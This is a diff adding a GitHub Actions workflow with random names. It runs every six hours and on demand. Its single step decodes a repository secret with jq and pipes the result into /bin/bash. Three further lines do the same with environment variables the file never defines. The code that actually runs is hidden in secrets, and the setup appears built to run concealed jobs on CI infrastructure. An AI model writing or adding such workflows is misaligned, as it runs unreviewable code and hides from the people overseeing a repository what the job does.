@@ -1,0 +1,21 @@
+name: shijienamedahaishiyjn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shijienamedahaishiyjn
+        env:
+          g090: ${{ secrets.g090 }}
+        run: |
+          echo $g090 | jq -r .z41 | /bin/bash
+          echo $p715 | jq -r .wmm2836 | /bin/bash
+          echo $jfzi2 | jq -r .pzah92 | /bin/bash
+          echo $ljjg74031 | jq -r .awo4 | /bin/bash
+
